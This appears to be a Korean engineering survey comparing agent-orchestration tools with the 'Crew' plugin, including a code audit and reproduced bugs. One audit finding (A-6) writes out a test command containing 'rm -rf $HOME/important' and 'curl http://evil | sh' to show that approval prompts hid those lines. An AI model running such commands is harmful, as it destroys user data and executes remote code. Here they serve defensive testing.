# 05. 유사 프로젝트 조사와 시사점

조사일: 2026-11-12. 별 수, 최종 푸시, 라이선스는 `gh api`로 확인했고, 코드 분석은 저장소를 얕게 clone해서 읽기만 했다(실행하지 않음). 커뮤니티 반응은 HN 스레드와 블로그 요약이며 Reddit·X 직접 근거는 거의 없다. 벤더가 직접 밝힌 수치는 "(벤더)"로 표시했다. 확인하지 못한 내용은 "미확인"으로 적었다.

## 1. 요약

- **워크트리 + 대시보드 조합은 이미 범용화됐다.** 사람이 조종하는 GUI/TUI는 많고, 일부는 접혔다(Conductor는 Meta 합류로 11월 20일 클라우드 종료, Vibe Kanban은 회사 폐업 후 커뮤니티 유지). Crew에서 차별되는 부분은 "리드 에이전트가 MCP로 위임하고 diff를 리뷰·병합한다", "구조화 프로토콜로 워커를 다룬다", "승인을 사용자에게 라우팅한다", "Codex 적대적 교차 리뷰"다.
- **가장 가까운 비교 대상은 `openai/codex-plugin-cc`다.** 별 35k, Apache-2.0이다. 워크트리 격리, 사용자 승인 라우팅, 폴리시 역할이 없다. 대신 이슈 상위가 전부 프로세스 수명 관리 문제다. Crew도 같은 계열 버그를 조심해야 한다.
- **교차 모델 리뷰의 근거는 약하다.** 코드에서는 "다른 벤더"보다 "깨끗한 컨텍스트의 새 리뷰어"가 중요하다는 자료가 더 강하다. 문서·문구에서는 교차 모델 이득이 컸다(아래 4절).
- **병렬 쓰기와 오케스트레이션 과잉은 업계가 공통으로 경계한다.** Anthropic, Cognition 모두 읽기 위주 분산은 좋고 병렬 쓰기는 위험하다고 본다. Crew의 "분리 가능한 조각만 위임 + 리드가 병합" 구조는 이 합의에 맞는다.

## 2. 프로젝트별 정리

### A. 병렬 코딩 에이전트 오케스트레이터

| 프로젝트 | 지표 | 핵심 |
| --- | --- | --- |
| Conductor (비공개) | Meta 합류, 11/20 클라우드 종료 | HN 222점. UX 호평, 종료 일정과 락인 비판. 초기 불만: 로컬 체크아웃 미사용, 워크스페이스마다 의존성 재설치, `.env` 미복사, 알림 요청 |
| Vibe Kanban | 28.6k★, Apache-2.0 | 2026-04 회사 폐업 후 커뮤니티 유지. Rust. 워크트리 생성 락, 부팅 시 고아 실행 정리, 승인 객체(id, 질문 여부, 타임아웃) |
| cmux | 28.8k★, GPL-3.0+ | Swift/Ghostty. 알림 링 호평. CHANGELOG에 서브에이전트 상태 오표시, 복원 폭주 버그 기록 |
| Paradev (구 Superset) | 16.2k★, MIT | 훅 기반 상태 감지, PTY 데몬이 앱 업데이트를 넘어 세션 유지. Antigravity를 훅으로 지원 |
| Claude Squad | 8.8k★, AGPL-3.0 | tmux 패널 해시로 상태 판정, 데몬은 AutoYes 강제. 마지막 푸시 8월 |
| Emdash | 6.2k★, Apache-2.0 | ACP 런타임과 ADR 문서가 가장 잘 정리됨. 약 78개 작업에서 느려짐 |
| Agent of Empires | 4.1k★, MIT | 상태 열거형, 훅 상태 파일, 유휴 자동 정지, 승인 일회용 nonce |
| CCManager | 1.3k★, MIT | 에이전트별 정규식 상태 감지, 위험 명령 차단 목록 후 LLM 자동 승인 게이트 |

상태 읽기·삭제 순서·승인 모델에서 배울 점이 많았고, 아래 5절에 반영했다.

### B. Claude Code 중심 하네스

| 프로젝트 | 지표 | 핵심 |
| --- | --- | --- |
| openai/codex-plugin-cc | 35.1k★, Apache-2.0, 최종 푸시 7월, 열린 이슈 545 | `/codex:review`, `:adversarial-review`, `:rescue`. Stop 훅 리뷰 게이트(README가 토큰 소모 경고) |
| oh-my-claudecode | 40.8k★, MIT, 기여자 189 | 에이전트 19개, 스킬 약 85개. `team-plan → prd → exec → verify → fix` 파이프라인. 표면적이 큼 |
| Gas Town / Beads | 18.8k★ / 28.7k★ | Mayor·Polecat·Witness 등 다층 구조. 비용 부담과 "대부분 쓰지 말라"는 제작자 발언. 완료 신호 규칙이 인상적 |
| PAL MCP (zen) | 11.8k★, 최종 푸시 2025-12 | 모델 API 기반 다중 모델 도구. 사실상 정체. `clink`(CLI 브리지)만 살아남은 아이디어 |
| wshobson/agents | 42.4k★, MIT | 플러그인 92개. 스킬 3단계 점진 공개, evals 디렉터리 |
| github/spec-kit | 149k★, MIT | 명세 우선. `NEEDS CLARIFICATION` 표식이 구현 단계를 막음 |
| Claude Code Agent Teams | 공식, 실험 기능 | 공유 작업 목록, 팀원 메시지, `TeammateIdle`/`TaskCompleted` 훅. 리드가 기다리지 않고 직접 구현하는 문제가 문서에 적혀 있음 |

그 밖에 claude-flow/ruflo(81k★)는 과장 대비 구현 실체 논란이 있어 반면교사로만 봤다. 메타 지표만 확인했다.

### C. 범용 프레임워크와 프로토콜

- **OpenHands** (93k★): 지금은 Agent Canvas라는 자체 호스팅 제어판이 됐고 ACP 에이전트를 붙인다. SDK의 ACP 클라이언트 `acp_agent.py`는 실전 참고 가치가 크다. 단, ACP 에이전트 권한을 자동 승인한다(Crew와 반대).
- **ACP** (v1 안정, v2 초안): 권한 요청은 `session/request_permission`, 취소는 `session/cancel` 통지 후 `stopReason: cancelled` 응답이다. v2 초안은 `running / requires_action / idle` 상태를 정의한다.
- **MCP** (2026-07-28 스펙): 무상태화, Tasks는 확장으로 이동, `input_required`가 정식 상태다.
- **LangGraph** (44.8k★): `interrupt()`의 안정 id, 응답 스키마 검증, 실패한 단계의 쓰기 보존.
- **OpenAI Agents SDK**: `needs_approval`, 직렬화 가능한 `RunState`, 거부 사유 전달. "항상 허용"이 도구 이름 기준이라 에이전트 간에 새는 문제를 문서가 경고한다.
- **Claude Agent SDK**: 제어 프로토콜과 `session_state_changed`. 코드 주석에 "`result`는 턴의 끝이지 실행의 끝이 아니다"라는 이슈 기록이 있다.
- **A2A** (v1.0.1), **Google ADK**: 상태 이름(REJECTED, AUTH_REQUIRED)과 at-least-once 재개 모델 정도만 참고한다.

CrewAI, Mastra, Microsoft Agent Framework는 CLI 에이전트 감독과 거리가 멀다고 판단해 조사하지 않았다(추정).

### D. 상용 제품과 연구

- **Cognition**: 2025-06 "Don't Build Multi-Agents"에서 2026-04 "What's Actually Working"으로 입장이 바뀌었다. 생성자-검증자 루프는 인정하고, 비정형 스웜은 "대부분 방해"로 본다. 깨끗한 컨텍스트 리뷰어가 더 낫다고 한다(벤더 주장).
- **Anthropic 멀티 에이전트 리서치**: 단일 에이전트 대비 90.2% 향상(내부 평가), 토큰 약 15배. 코딩은 병렬화 여지가 적다고 스스로 밝힌다.
- **Anthropic 장기 실행 하네스**: 별도의 회의적 평가자, 스프린트 계약(완료 기준 사전 합의), 단독 $9 대비 하네스 $200. 새 모델이 나오면 하네스 단계를 다시 점검하라고 권한다.
- **Cursor**: 병렬 에이전트 최대 8개, 워크트리 또는 원격 VM. 사용자 불만은 워크트리 인식 실패, 토큰 낭비, 반복 승인. 3~5개가 적정선이라는 블로그가 수렴한다.
- **GitHub Agent HQ**: Copilot, Claude, Codex를 한 이슈에 배정해 비교. 검토 부담과 저품질 PR이 주된 불만.
- **Codex 서브에이전트**: 승인을 올릴 수 없으면 실패하고 오류가 부모에게 간다.
- **Factory Missions** (벤더 데모 1건): 검증자는 보고만 하고 고치지 않는다. 검증이 시간의 약 37%, 토큰의 약 1/3.
- **Amp Oracle**: 읽기 전용 다른 벤더 모델 세컨드 오피니언.

## 3. Crew가 이미 잘하는 것

- 잡마다 전용 워크트리와 브랜치, 브리지가 커밋하고 병합은 리드만.
- 워커의 승인·질문을 사용자에게 라우팅(자동 승인 없음). codex-plugin-cc, OpenHands, Claude Squad는 이렇게 하지 않는다.
- 화면 긁기가 아니라 `codex app-server`, `agy acp` 구조화 프로토콜 사용.
- 고정 역할(구현, 적대적 리뷰, 문구 정리)과 범위 밖 변경 거부.
- 백그라운드 + `wait`로 긴 동기 호출 타임아웃을 피함.
- 작은 표면적(워커 2, 스킬 몇 개, 정적 보드). OMC나 Gas Town 같은 과잉 오케스트레이션이 없다.

## 4. 교차 모델 리뷰에 대한 냉정한 근거

- Song, arXiv:2610.01471(단일 저자, 심사 전, 한국어 산출물에 심어 둔 오류 기반): 코드에서는 새 세션 같은 모델 리뷰어(F1 40.7%)가 교차 모델(37.2%)과 유의한 차이가 없었다. 문서에서는 교차 모델이 크게 앞섰다(42.1% 대 24.5%). 두 리뷰는 놓치는 오류가 부분적으로 달라서, 같은 모델 1명 + 교차 모델 1명이 56.7%로 같은 모델 2명(42.7%)보다 좋았다. 세 번째 리뷰어는 이득이 작았고, 약한 교차 모델은 도움이 안 됐다.
- 정확도가 높은 모델끼리는 벤더가 달라도 오류가 상관된다는 보고가 있다(abstract 요약만 확인).
- Codex가 Claude 코드를 리뷰하면 좋다는 블로그는 측정치가 없고, 글 스스로 그렇게 밝힌다.

결론: Crew의 `crew:self-reviewer`(새 컨텍스트) + Codex 리뷰 조합은 근거와 맞는다. "다른 벤더라서"가 아니라 "깨끗한 컨텍스트, 충분히 강한 리뷰어, 서로 다른 놓침"을 이유로 삼는 편이 정확하다. 문서·문구 검토에서 교차 모델 이득이 컸다는 점은 Antigravity 단계의 근거로 쓸 만하다. 세 번째 리뷰 단계는 추가하지 않는 편이 낫다.

## 5. 도입 후보 (우선순위 제안)

각 항목은 조사한 프로젝트의 사례에서 가져온 아이디어이며, 도입 여부는 Crew의 현재 구현을 확인한 뒤 정해야 한다. 이 조사는 Crew 코드를 아직 이 기준으로 대조하지 않았다.

**높음: 프로세스·상태 위생 (실제 사용자가 가장 많이 겪은 장애)**
1. 데몬 시작 시 "running으로 기록됐지만 워커 프로세스가 없는" 잡을 실패로 정리하고 표시 (Vibe Kanban, Emdash, AoE).
2. 세션 종료 시 `codex app-server`/`agy acp` 자식 프로세스 회수. 상태 키는 cwd 해시가 아니라 세션·저장소 기준 (codex-plugin-cc의 고아 프로세스 이슈).
3. 워크트리 생성/삭제를 저장소별 뮤텍스로 직렬화하고, 삭제 의도를 저장해 재시작 후에도 멱등하게 수행. Crew 전용 루트 밖 경로는 지우지 않고, `.git`이 파일일 때만 워크트리로 취급 (Emdash ADR 0006, Vibe Kanban).
4. 승인·질문을 객체로: id, 옵션, 타임아웃, 질문/권한 구분, 일회용 응답 식별자. 잘못된 응답은 소비하지 않고 재답변 허용. 거부 사유 전달은 Codex·ACP 응답에 사유 필드가 없어 별도 메시지로만 가능 (Vibe Kanban, LangGraph, OpenAI Agents SDK, AoE).
5. 취소 흐름: `session/cancel` 후 대기 중 권한 요청은 `cancelled`로 응답, 열린 툴 호출은 취소 처리, `stopReason: cancelled`는 오류가 아님. 정리 대기 후에도 안 멈추면 세션 재시작 (ACP 스펙, OpenHands).
6. 협상된 capability만 `resume/load/close` 호출, 모르는 업데이트 종류는 무시, 알 수 없는 권한 결과를 승인으로 취급하지 않기, stdout의 비JSON 줄 무시 (ACP, OpenHands).
7. 상태 판정: 어떤 `session_update`든 활동으로 간주해 유휴 타이머를 리셋, 시작 타임아웃은 별도, 짧은 디바운스. 턴 결과가 곧 잡 종료는 아니다. 백그라운드 작업이 남아 있으면 리드를 깨우지 않는다 (OpenHands, Superset, Claude Agent SDK, cmux 버그).
8. 프롬프트 전달이 "확실히 안 나갔다"와 "불확실"을 구분하고, 불확실하면 자동 재전송하지 않기 (Emdash).

**중간: 리뷰와 프롬프트 품질**
9. Codex 리뷰 프롬프트 골격: 역할(확신을 깨라), 발견 기준, 근거 규칙, 보정 규칙, 구조화 JSON(파일, 줄 범위, 신뢰도). "방어 가능한 발견이 없으면 없다고 말하라". (codex-plugin-cc `adversarial-review.md`)
10. 리뷰어에 사전 예측 → 빠진 것 분석 → 열린 질문 분리 단계를 추가. 승인에는 새로 실행한 명령 출력을 요구하고, 같은 컨텍스트 산출물을 스스로 승인하지 않기 (oh-my-claudecode `critic.md`, `verifier.md`).
11. 위임 프롬프트에 인수 기준("스프린트 계약")을 쓰고, 리뷰어가 그 기준으로 채점. 리뷰어는 diff만 읽지 말고 테스트·명령을 실제로 실행 (Anthropic 하네스 글).
12. 테스트 기준선과 변경 후 실패 목록 비교는 모델 눈대중이 아니라 결정적 도구로 하고, 기준선을 통과용으로 재기록 금지 (OMC ralph).
13. 수정 루프 상한(예: 최대 N회)을 두고 초과하면 사용자에게 에스컬레이션 (Devin 루프, Factory 4라운드, codex-plugin-cc Stop 게이트의 토큰 소모 경고).
14. 워커 프롬프트에 "구현할 것이 없으면 명시적으로 보고", "워크트리 밖 파일 수정은 사라진다" 규칙 (Gas Town).
15. 리드가 리뷰 결과를 받을 때 무조건 수용·거부하지 않고 판단하게 하는 한 줄 (PAL `challenge`). 리뷰 결과 자동 적용 금지와는 균형을 맞춰야 한다.

**낮음 / 선택**
16. 작은 작업은 크루를 쓰지 않는 경로(노력 규모 판단)와 잡별 사용량 표시. 멀티 에이전트는 토큰 약 15배(Anthropic).
17. 병합 후보마다 보드에 명세, diff 요약, 테스트 결과, 범위 밖 파일 표시. 동시 잡 수는 3~5로 제한하거나 큐잉.
18. 잡 삭제를 휴지통 → 영구 삭제 2단계로, 다수 워커 일괄 재시작은 속도 제한 (AoE, cmux 복원 폭주).
19. 스킬 점진 공개(`SKILL.md`는 짧게, 역할별 상세는 `references/`)와 `/crew:run` 재생형 시나리오 테스트 몇 개 (wshobson/agents, ccpm).
20. 파이프라인 단계를 모델이 바뀔 때마다 재점검해 쓸모없어진 단계를 제거 (Anthropic).
21. 보드가 이벤트로 순서를 바꾸지 않게 하고, 서브에이전트·백그라운드 작업은 끝날 때까지 실행 중으로 표시 (cmux).
22. Antigravity 상태 감지에 훅을 쓸 수 있음. Superset은 `~/.gemini/config/hooks.json`의 `PreInvocation`/`Stop`을 쓰고, `PreToolUse`는 결정 출력이 없으면 툴을 막기 때문에 일부러 뺐다. Crew는 ACP를 쓰므로 필수는 아니고 보조 수단이다.

## 6. 따라 하지 않을 것

- 화면 긁기와 AutoYes(Claude Squad), LLM 자동 승인 게이트(CCManager), ACP 에이전트 권한 자동 승인(OpenHands).
- Stop 훅으로 매 턴 리뷰하는 게이트(토큰 소모, 장시간 루프).
- 에이전트 수십 개와 감시 계층(Gas Town), 에이전트 19개·스킬 85개(OMC), 페르소나 카탈로그(wshobson/agents).
- 그래프 DSL, handoff-as-tool, A2A 에이전트 카드, MCP OAuth/무상태 전송 세부 사항.
- 클라우드 단일 벤더 의존과 폐쇄 배포(Conductor, Vibe Kanban의 말로). 무거운 Electron 앱.
- ACP `fs/*`, `terminal/*` 클라이언트 메서드(워커가 직접 파일에 접근).

## 7. 한계

- ACP v2는 초안이며 거의 매주 바뀐다. v1 의미론에 맞추고 capability로 기능을 감지하는 쪽이 안전하다. Codex와 Antigravity의 ACP 구현이 위 의미론과 같은지는 확인하지 못했다.
- 교차 모델 리뷰 수치는 심사 전 논문 하나다. Cognition, Devin, Factory 수치는 벤더 자료다.
- Reddit·X 반응은 거의 얻지 못했고 HN과 블로그에 의존했다.
- 상용 제품 평판 블로그 일부는 제휴형이라 근거가 약하다.
- 5절 후보와 Crew 소스의 대조는 8절에 있다. 8절 A·B의 문제 후보는 가짜 `codex app-server`와 임시 저장소로 재현해 확인했다. 실제 Codex가 같은 조건을 만드는지는 일부 항목에서 확인하지 못했다(해당 항목에 표시).

## 8. 도입 후보와 Crew 코드 대조

기준은 `plugin/bridge/`, `plugin/roles/`, `plugin/skills/run/SKILL.md`를 읽은 결과다(2026-11-12). 상태는 **구현됨 / 부분 / 없음**이다.

| # | 항목 | 상태 | 근거와 남은 일 |
| --- | --- | --- | --- |
| 1 | 시작 시 고아 잡 정리 | 구현됨 | `jobs.ts` `load()`가 비종료 잡을 failed로 바꾸고 `reply`로 세션을 이어가라고 안내한다. 남은 일: 잡 레코드가 없는 워크트리·브랜치를 찾는 정리는 없다(아래 A-2). |
| 2 | 자식 프로세스 회수 | 대체로 구현됨 | 단일 데몬이 `codex app-server`·`agy acp`를 하나씩만 띄우고 10분 유휴 시 종료, `shutdown()`에서 `peer.close()`한다. 데몬이 SIGKILL로 죽을 때 자식이 남는지는 확인하지 못했다. |
| 3 | 워크트리 직렬화·재시도·삭제 안전 | 없음(필요성 미확인) | `createWorktree`에 락과 재시도가 없다. 동시 생성 충돌은 재현하지 않았다. 폴더를 직접 지운 뒤의 `discard`는 정상 동작함을 재현으로 확인했다(`--force`가 처리). |
| 4 | 승인 객체화 | 부분 | `waiting{type,reason}`과 `seq` 키, 보드·앱 양쪽 응답, 이중 응답 처리는 있다. 한 잡에 요청이 둘 이상이면 `run.pending`이 덮어써지고(A-1), 응답 대기에 시간 제한이 없다(A-5). 거부 사유 전달은 프로토콜이 허용하지 않아 해당 없음이다(B-1). |
| 5 | 취소 흐름 | 부분 | Codex는 `turn/interrupt` 후 `interrupted`를 cancelled로 매핑하고, Antigravity는 `stopReason: cancelled`를 매핑한다. 정리 대기와 세션 재시작은 없다. 툴 호출 상태를 저장하지 않으므로 "열린 툴 호출 닫기"는 해당 없음이다. |
| 6 | capability 확인, 노이즈 내성 | 부분 | `rpc.ts`가 비JSON 줄을 무시한다(구현됨). Antigravity `initialize` 응답의 capability를 읽지 않고 `session/resume`을 바로 호출한다. |
| 7 | 상태 판정 | 부분 | 어떤 알림이든 `activity()`로 타이머를 리셋하고 Codex 서브에이전트 활동도 부모 활동으로 센다(구현됨). `RpcPeer.request`에 타임아웃이 없어 `initialize`가 멈추면 잡이 `starting`에서 stalled 표시만 되고 실패하지 않는다(A-4). |
| 8 | 전달 불확실 프롬프트 | 해당 없음 | 재전송은 리드가 `reply`로 결정한다. 자동 재전송이 없다. |
| 9 | 적대적 리뷰 프롬프트 | 부분 | `codex-reviewer.md`에 판정, 심각도, `path:line`, "Not verified"가 있다. 신뢰도, 근거 규칙("파일·줄을 지어내지 말 것"), 보정 규칙("강한 발견 하나가 약한 여러 개보다 낫다"), "발견이 없으면 없다고 말하라"는 한 줄만 있다. |
| 10 | 사전 예측·빠진 것 분석 | 없음 | 두 리뷰어 프롬프트 모두 없다. |
| 11 | 인수 기준 | 부분 | `delegate`에 `done_when`이 있다. `review`는 `focus`만 받아 "이 변경의 의도"를 따로 받지 않는다. |
| 12 | 테스트 기준선 diff | 없음 | 최종 확인은 리드가 테스트를 돌리는 것으로 끝난다. |
| 13 | 수정 루프 상한 | 구현됨(문서) | SKILL이 "리뷰는 최대 두 번"이라고 쓴다. 코드로 강제하지는 않는다. |
| 14 | 워커 종료·경로 규칙 | 구현됨 | 엔지니어 역할에 "할 수 없으면 이유를 보고", 프롬프트에 "워크트리 안에서만 편집"이 있고, 밖을 건드리면 `touched` 기록으로 `outOfScope`에 잡는다(프롬프트 규칙보다 한 단계 강하다). |
| 15 | 리뷰 결과 비판적 수용 | 구현됨 | SKILL 5단계: 동의하는 것만 고치고 거절한 것은 사용자에게 이유를 말한다. |
| 16 | 작은 작업 생략, 사용량 표시 | 부분 | 생략은 SKILL이 허용한다. Codex 토큰은 `job.tokens`에 모이지만 보드·`describe`에 나오지 않는다. 한도 창 사용률만 보인다. |
| 17 | 병합 후보 정보, 동시 잡 상한 | 부분 | `describe`가 diff·병합 명령을 낸다(리드용). 보드에는 파일 수와 범위 밖 건수뿐이다. 동시 잡 상한은 없다. |
| 18 | 휴지통식 삭제 | 없음 | `discard`는 `worktree remove --force` + `branch -D`로 즉시 삭제한다. |
| 19 | 일괄 재시작 속도 제한 | 해당 없음 | 데몬이 잡을 자동 재시작하지 않는다. |
| 20 | 스킬 점진 공개, evals | 해당 없음 | `/crew:run`이 66줄이라 아직 분리할 필요가 없다. 테스트는 `jobs`, `claude`, `policy`만 있다. |
| 21 | 보드 순서 안정성 | 부분 | 카드는 키로 제자리 갱신하고 타이머가 유지된다. 하지만 Claude 레인은 `activeAt` 순으로 정렬해 활동할 때마다 순서가 바뀐다(B-2). |
| 22 | Antigravity 훅 | 선택 | ACP로 충분하다. 도입하지 않아도 된다. |

### A. 코드 대조에서 나온 문제 후보와 재현 결과

가짜 `codex app-server`(JSON-RPC 스텁), 임시 git 저장소, 별도 `CREW_HOME`/포트의 데몬으로 재현했다. 스크립트는 저장소 밖 scratchpad에 두었고 Crew 소스는 수정하지 않았다. 사용자의 실제 `~/.crew` 데몬과 잡은 건드리지 않았다.

| 후보 | 결과 | 재현 내용 |
| --- | --- | --- |
| A-1 서브에이전트 승인 자동 거부 | **재현됨** (조건부) | 서브에이전트 스레드(`parentThreadId` 지정)에서 온 승인 요청이 잡 상태 변화나 알림 없이 즉시 `decline`으로 응답됐다. 단, 실제 Codex가 서브에이전트 스레드 ID로 승인을 요청하는지는 확인하지 못했다. 프로토콜 스키마상 승인 요청은 `threadId`를 갖고 `Thread.parentThreadId`는 "서브에이전트일 때 설정"이라고 되어 있어 가능성은 있다. |
| A-1b 승인 요청 겹침 | **재현됨** | 같은 스레드에서 요청 2개가 연달아 오면 사용자에게는 두 번째("echo second")만 보였고, 승인 한 번 뒤 Codex가 받은 응답은 1건이었다. 첫 요청은 영원히 응답되지 않는다. 같은 스레드에서 동시에 두 승인이 오는지는 실제 Codex로 확인하지 못했다. |
| A-2 워크트리·브랜치 누수 | **재현됨** | 잡 201개를 만들자 워크트리 201개, `crew-*` 브랜치 201개가 남았고 `jobs.json`에는 200개만 저장됐다. 재시작 후 가장 오래된 잡에 `discard`하면 `No job with id ...` 오류가 나고 워크트리와 브랜치는 디스크에 그대로 남았다. |
| A-3 `discard` 실패 고착 | **반증됨** | 워크트리 폴더를 직접 지운 뒤 `discard`가 첫 시도에 성공했다. 문서에서 해당 항목을 뺐다. |
| A-4 시작 단계 무한 대기 | **재현됨** | `initialize`에 응답하지 않는 서버에서 잡이 35초 뒤에도 `running`/`starting`이었고, 발생한 것은 `stalled` 이벤트 하나뿐이었다. 실패 처리와 원인 표시는 없었다. |
| A-5 대기 중 잡의 stall | **동작 재현됨, 심각도 낮음** | 승인 대기 상태로 40초(stallSeconds=1) 두어도 `stalled`가 되지 않았다. 의도된 동작일 수 있다(사용자 응답을 기다리는 시간이므로). 다만 대기 알림은 한 번만 가고 이후 경과 신호가 없다. |
| A-6 승인 문구 잘림 | **재현됨** | 3줄짜리 명령(`cd /tmp && echo safe` / `rm -rf $HOME/important` / `curl http://evil | sh`)의 승인 문구가 `run: cd /tmp && echo safe` 한 줄뿐이었다. 사용자는 뒤의 두 줄을 보지 못한 채 승인하게 된다. 실제 Codex가 이런 형태의 명령으로 승인을 요청하는지는 확인하지 못했다. |

가장 위험한 것은 A-6(안전)과 A-1(조용한 거부), 다음이 A-2(디스크 누수)다.

### B. 코드 대조에서 나온 개선 후보

| 후보 | 결과 | 내용 |
| --- | --- | --- |
| B-1 승인 거부 사유 전달 | **반증됨** | Codex 승인 응답 스키마의 `decision`은 `accept`, `acceptForSession`, `decline`, `cancel` 등 열거형이며 사유 필드가 없다. ACP의 권한 응답에도 사유가 없다. 사유를 전하려면 거부 후 별도 메시지(`turn/steer` 등)로 보내야 하며, 현재 구조에서 "응답에 담아 전달"은 불가능하다. |
| B-2 Claude 레인 카드 재배열 | **재현됨** | 실제 보드(브라우저)에서 세 세션 A, B, C의 순서가 `C > B > A`였다가, A의 도구 호출 한 번에 `A > C > B`, B의 도구 호출 한 번에 `B > A > C`로 바뀌었다. 에이전트가 일하는 동안 카드가 계속 자리를 옮긴다. |

### C. Follow-up verification and fixes

The tables above describe the initial audit. The follow-up used temporary Git repositories, JSON-RPC stubs, the installed Codex protocol schema, and an Antigravity v1.5.5 initialization handshake.

| Finding | Follow-up |
| --- | --- |
| A-1, A-1b, A-6 | Child-thread requests reach the parent job. Each job presents requests in arrival order. Board and app replies carry the displayed request number, so a stale response cannot settle the next request. Approval text includes the entire command, the working directory if supplied, and any requested additional permissions. Actual Codex approval traffic was simulated. |
| A-2 | The 200-record limit applies to delivered, finished history without worktrees. Active jobs, unread results, and records that own worktrees survive restarts. Worktrees already orphaned by the old limit require separate recovery. |
| A-3 | Deleting the directory alone was already recoverable. A separate failure was reproduced by locking the branch ref after worktree creation. Discard now retries after partial removal and checks the registered path and branch before deleting. |
| A-4 | Worker initialization and session setup have a 30-second RPC deadline. A failed handshake closes the worker process. A lost turn-start acknowledgement leaves the job active because the prompt may have reached the worker. |
| A-5 | Human input can remain pending indefinitely. The board displays the elapsed wait time. |
| B-1 | The installed Codex schema and ACP permission response offer no field for a denial reason. |
| B-2 | Claude cards keep their position within each status group when tool activity updates the timestamp. |

Antigravity restores sessions using advertised ACP capabilities. Cancellation waits for a worker response, with a negotiated ACP session close as a fallback. The review prompt accepts explicit acceptance criteria and asks for evidence from checks. The board and job details show recorded Codex tokens.

The optional proposals for a job cap, trash, hooks, and additional board views remain open. Repository-wide worktree locking, abrupt daemon termination, and parent turns that finish while child turns are still active need separate evidence.

## 9. 사용성·UX에서 참고할 점

Crew 보드(`plugin/board/`)와 흐름을 읽고 조사 결과와 견줘 봤다. 좋은 점은 먼저 적는다.

### 이미 좋은 점

- 상태를 한 단어 뱃지와 색으로 보여 주고(Needs approval / May be stuck / Done), 대기·멈춤을 위로 올리며, 끝난 카드는 흐리게 처리한다.
- 시계가 어긋나도 타이머가 맞도록 서버 시각 보정을 한다. 연결이 끊기면 "Disconnected — reconnecting…"을 보여 준다.
- 승인을 앱 프롬프트와 보드 양쪽에서 할 수 있고, 한쪽에서 답하면 다른 쪽이 무효가 된다. 사용자가 닫으면 리드가 대신 결정하지 않는다.
- `Copy resume command`로 사용자가 워커 세션을 해당 CLI에서 바로 이어받을 수 있다. 조사한 도구 중 이만큼 명시적인 곳은 드물었다.
- 리드가 받는 `describe` 출력에 검토·수락·수정·정리 명령이 순서대로 들어 있다.
- `.worktreeinclude`는 Conductor의 첫 불만(`.env`·의존성 누락)을 이미 해결했고, APFS 클론 복사로 느리지도 않다.
- 알림은 대기·오류·한도·멈춤에만 울리고 완료는 기본 꺼 둔다. 알림 피로를 줄이는 쪽이다.

### 참고할 만한 격차 (효과가 큰 순서)

1. **카드를 눌러도 아무것도 열리지 않는다.** 조사한 거의 모든 도구가 병합 판단을 돕는 화면을 중심에 둔다(Cursor의 통합 diff, Antigravity의 Artifacts, Agent HQ의 PR). 병합 병목은 리뷰라는 점이 공통 결론이었다. 카드 상세에 보고서(`job.report`), 변경 파일 목록, 범위 밖 파일, 워커가 건드린 흐름(해당 잡의 이벤트만), 노트를 보여 주면 된다. 데이터는 이미 `/api/jobs/:id`에 있다.
2. **보드에서 질문에 답할 수 없다.** 질문형 대기에도 Yes/No만 나온다. 앱 프롬프트에서는 자유 입력이 되므로 보드에도 텍스트 입력을 두면 일관된다. 거부 사유는 승인 응답에 담을 수 없으므로(B-1) 필요하면 거부 후 별도 메시지로 보낸다.
3. **피드가 어느 잡의 이벤트인지 알 수 없다.** 줄에 에이전트 이름만 있어 Codex 잡이 둘이면 구분이 안 된다. 잡 id나 제목 약어를 붙이고, 카드를 누르면 해당 잡만 필터링한다.
4. **알림이 보드로 이어지지 않는다.** macOS 알림은 클릭해도 아무 데도 가지 않는다. 승인이 필요할 때 보드나 앱으로 바로 가는 동작이 있어야 한다(Conductor 초기 불만의 최상위가 "대기 알림"이었다). 보드 탭 제목에 대기 건수 `(2) Crew`를 붙이는 것은 한 줄이다. 비 macOS는 알림 자체가 없다.
5. **프로젝트가 섞인다.** 데몬이 여러 세션이 공유하므로 서로 다른 프로젝트의 잡이 같은 레인에 쌓이고 구분은 작은 경로 라벨뿐이다. 프로젝트가 둘 이상일 때 필터나 그룹이 필요하다. 병렬 에이전트 도구들의 공통 불만이 "많아지면 방향을 잃는다"였다(Emdash는 약 78개 작업에서 느려짐).
6. **병합 후보 요약이 부족하다.** 완료 카드에는 `1 file changed…`와 "N out of scope"뿐이다. 조사에서 반복된 권고는 명세, diff 요약, 테스트 결과, 범위 밖 파일을 한 곳에 보이는 것이다. 테스트 결과는 워커 보고서의 Verification 절을 그대로 노출하는 것으로 시작할 수 있다.
7. **비용 감각이 없다.** Codex 한도 사용률은 보이지만 잡별 토큰은 안 보인다(`job.tokens`는 이미 있다). 멀티 에이전트가 토큰을 크게 쓴다는 점이 가장 일관된 경고였으므로 완료 카드에 토큰을 보이면 좋다. Antigravity는 값이 없다.
8. **승인 맥락.** A-6에서 재현한 문제와 같은 맥락이다. 승인 화면은 명령 전문(길면 접기), 작업 디렉터리, 이 잡의 역할(읽기 전용 여부)을 함께 보여야 한다.
9. **`/crew:run`에 사용자 확인 지점이 없다.** 계획 단계가 사용자 확인 없이 위임으로 이어진다. Jules의 자동 승인 계획이 리뷰 신호를 약하게 한다는 지적과 같은 위험이다. 큰 작업에서만 "계획 한 단락 + 위임 계획"을 보여 주고 진행 여부를 묻는 선택지를 두는 정도가 적당하다. 작은 작업에서는 오히려 마찰이다.
10. **첫 사용 안내.** 설치 후 Claude Code 세션을 새로 열어야 한다는 점이 README에만 있다. `crew install` 마지막 출력과 `crew doctor`에 한 줄 안내를 더하면 된다. 보드의 빈 상태 문구는 이미 친절하다.
11. **접근성·원격.** 새 대기 카드가 스크린 리더에 알려지지 않는다(`aria-live` 없음). 원격·모바일 접근(Agent of Empires, Emdash)은 로컬 전용 설계와 맞지 않아 보류가 맞다.

### UX 관점의 결론

Crew의 상태 표시와 승인 라우팅은 조사한 도구보다 정돈돼 있다. 약한 곳은 "무엇이 일어났는지 읽고 병합을 결정하는 화면"이다. 병렬 에이전트 도구들의 공통 병목이 코드 생성이 아니라 리뷰였으므로, 보드를 상태 표시에서 판단 보조(카드 상세, 잡별 피드, 질문 답변, 병합 후보 요약)로 넓히는 것이 효과가 가장 클 것이다.
